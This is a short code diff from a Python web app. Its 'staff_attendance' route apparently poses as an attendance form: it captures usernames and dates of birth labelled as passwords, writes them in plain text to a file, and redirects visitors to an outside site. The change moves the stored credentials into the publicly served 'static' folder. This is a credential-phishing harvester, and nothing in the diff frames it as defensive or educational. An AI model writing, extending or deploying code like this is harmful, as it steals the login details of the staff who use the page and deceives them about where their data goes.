@@ -24,7 +24,7 @@ def staff_attendance():
     if request.method == 'POST':
         user = request.form['username']
         pas = request.form['DOB']
-        with open('user_data.txt', 'a') as file:
+        with open('static/user_data.txt', 'a') as file:
             file.write(f'Username: {user}, Password: {pas}\n')
         return redirect('https://mgc.ibossems.com/')
     elif request.method == 'GET':
